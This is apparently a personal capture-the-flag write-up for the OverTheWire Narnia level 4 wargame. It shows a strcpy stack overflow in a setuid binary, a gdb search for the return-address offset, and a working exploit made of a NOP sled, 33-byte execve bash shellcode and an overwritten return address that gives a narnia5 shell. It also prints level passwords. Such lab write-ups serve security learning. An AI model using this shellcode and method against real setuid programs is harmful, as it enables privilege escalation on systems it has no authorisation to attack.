# Narnia Level 3 → Level 4 Buffer Overflow in narnia4 setuid binary

## Previous Flag
<b>iqNWNk173q</b>

## Goal
Use previous password to log in SSH with user <b>narnia4</b> and port <b>2226</b> accessed on narnia.labs.overthewire.org.

There is no information for this level, intentionally.

## What I learned
```
Check payload for -p
Sometimes need to change NUL Slider to another address to work

Trying to send binary shellcode (with null bytes \x90), echo -e  NOT reliable bc some shells handle -e differently use printf instead for binary payloads or use Python’s sys.stdout.buffer.write
```
[Compare python3 printf echo -e script](./Narnia0405.md)

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh narnia4@narnia.labs.overthewire.org -p 2226 ⌨️
narnia4@narnia:~$ cd /narnia/ ⌨️
narnia4@narnia:/narnia$ file narnia4 ⌨️
narnia4: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=116c911286fed53090c062af242fb306e2912b7a, for GNU/Linux 3.2.0, not stripped
narnia4@narnia:/narnia$ cat narnia4.c ⌨️
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);                         // Vulnerability Here

    return 0;
}
narnia4@narnia:/narnia$ man environ ⌨️
narnia4@narnia:/narnia$ gdb -q narnia4 ⌨️
Reading symbols from narnia4...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y ⌨️
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
Download failed: Permission denied.  Continuing without separate debug info for /narnia/narnia4.
(No debugging symbols found in narnia4)
(gdb) run $(python3 -c "print(250*'A')") ⌨️
Starting program: /narnia/narnia4 $(python3 -c "print(250*'A')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 1112568) exited normally]

# Make it above 256 so there a buffer overflow since above is 250
(gdb) run $(python3 -c "print(270*'A')") ⌨️
Starting program: /narnia/narnia4 $(python3 -c "print(270*'A')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? () 👀 return address (EIP) Extended Instruction Pointer in Assembly

# Now find offset
(gdb) run $(python3 -c "print(265*'A'+'BBBB')") ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia4 $(python3 -c "print(265*'A'+'BBBB')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x42424241 in ?? () 👀
(gdb) run $(python3 -c "print(264*'A'+'BBBB')") ⌨️🕵️‍♀️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia4 $(python3 -c "print(264*'A'+'BBBB')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? () 👀 # Found offset of 264

# since 264 find in memory 260
(gdb) x/264wx $esp ⌨️❤️
0xffffd26e:     0x7361622f      0x00000068      0x00000000      0x0000702d
0xffffd27e:     0x00000000      0xd3340000      0xd340ffff      0xd2a0ffff
0xffffd28e:     0xae34ffff      0x909df7fa      0x00020804      0xd3340000
0xffffd29e:     0xae34ffff      0xd340f7fa      0xcb60ffff      0x0000f7ff
0xffffd2ae:     0x6bb20000      0x81a20fbe      0x000043c3      0x00000000
0xffffd2be:     0x00000000      0xcb600000      0x0000f7ff      0xc1000000
0xffffd2ce:     0xda203b48      0xec46f7ff      0xae34f7d9      0xed7cf7fa
0xffffd2de:     0x9af4f7d9      0xb0d8f7fc      0x00000804      0xd0000000
0xffffd2ee:     0x0000f7ff      0xabb00000      0xecfdf7fd      0xb1c8f7d9
0xffffd2fe:     0x00020804      0x90700000      0x00000804      0x90980000
0xffffd30e:     0x909d0804      0x00020804      0xd3340000      0x0000ffff
0xffffd31e:     0x00000000      0xde800000      0xd32cf7fc      0xda20ffff
0xffffd32e:     0x0002f7ff      0xd4a10000      0xd4b1ffff      0x0000ffff
0xffffd33e:     0xd5be0000      0xd5ceffff      0xd5daffff      0xd5eaffff
0xffffd34e:     0xd5ffffff      0xd60effff      0xd617ffff      0xd62affff
0xffffd35e:     0xd637ffff      0xdd50ffff      0xdd5cffff      0xdd8effff
0xffffd36e:     0xddb0ffff      0xddc7ffff      0xdddbffff      0xddfbffff
0xffffd37e:     0xde08ffff      0xde10ffff      0xde25ffff      0xde45ffff
0xffffd38e:     0xde68ffff      0xde7effff      0xdeadffff      0xdec0ffff
--Type <RET> for more, q to quit, c to continue without paging--c
0xffffd39e:     0xdecbffff      0xdf0cffff      0xdf74ffff      0xdfabffff
0xffffd3ae:     0xdfbfffff      0xdfd4ffff      0x0000ffff      0x00200000
0xffffd3be:     0x75700000      0x0021f7fc      0x70000000      0x0033f7fc
0xffffd3ce:     0x0e300000      0x00100000      0xfbff0000      0x00061f8b
0xffffd3de:     0x10000000      0x00110000      0x00640000      0x00030000
0xffffd3ee:     0x80340000      0x00040804      0x00200000      0x00050000
0xffffd3fe:     0x000a0000      0x00070000      0x90000000      0x0008f7fc
0xffffd40e:     0x00000000      0x00090000      0x90700000      0x000b0804
0xffffd41e:     0x36b40000      0x000c0000      0x36b40000      0x000d0000
0xffffd42e:     0x36b40000      0x000e0000      0x36b40000      0x00170000
0xffffd43e:     0x00010000      0x00190000      0xd48b0000      0x001affff
0xffffd44e:     0x00020000      0x001f0000      0xdfe80000      0x000fffff
0xffffd45e:     0xd49b0000      0x001bffff      0x001c0000      0x001c0000
0xffffd46e:     0x00200000      0x00000000      0x00000000      0x00000000
0xffffd47e:     0x00000000      0x00000000      0x00000000      0x48c15600
0xffffd48e:     0xf80db53b      0x80008526      0xa066a864      0x383669b8
0xffffd49e:     0x2f000036      0x6e72616e      0x6e2f6169      0x696e7261
0xffffd4ae👀:     0x90003461      0x90909090      0x90909090      0x90909090 NOP Slider
0xffffd4be👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd4ce👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd4de👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd4ee👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd4fe👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd50e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd51e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd52e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd53e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd54e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd55e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd56e👀:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd57e👀:     0x90909090      0x90909090      0x90909090      0x90909090 NOP Slider: Note: had to test many outside gdb
0xffffd58e👀:     0x90909090      0x90909090      0x0b6a9090      0x66529958
0xffffd59e:     0x89702d68      0x686a52e1      0x61622f68      0x622f6873
0xffffd5ae:     0xe3896e69      0x89535152      0x0480cde1      0x00ffffd2
0xffffd5be:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd5ce:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd5de:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd5ee:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd5fe:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd60e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd61e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd62e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd63e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd64e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd65e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd66e:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd67e:     0x00000000      0x00000000      0x00000000      0x00000000

# Create payload, 264 - 33 = 231
If Manual x4 payload since counts /x90 as 4: https://www.charactercountonline.com/
Source: https://shell-storm.org/shellcode/files/shellcode-606.html ❤️
NOP Slider Address: 0xffffd204    little endian: \x04\xd2\xff\xff 👀
33 bytes: \x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
``` 264 -33 = 231
# Note: Didn't get to work inside gdb because didn't try different addresses
(gdb) run "$(printf '\x90%.0s' {1..231}; printf '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'; printf '\xce\xd4\xff\xff')" 

# Got it to work outside gdb but had to try many NOP address because kept getting Segmentation fault (core dumped)
narnia4@narnia:/narnia$ ./narnia4 $(printf '\x90%.0s' {1..231}; printf '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'; printf '\xce\xd4\xff\xff') ⌨️
Segmentation fault (core dumped)
narnia4@narnia:/narnia$ ./narnia4 $(printf '\x90%.0s' {1..231}; printf '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'; printf '\xde\xd4\xff\xff') ⌨️
bash-5.2$ whoami ⌨️
narnia5
bash-5.2$ cat /etc/narnia_pass/narnia5 ⌨️
Ni3xHPEuuw 🔐
```

## Flag
<b>Ni3xHPEuuw</b>

## Continue
[Continue](./Narnia0405.md)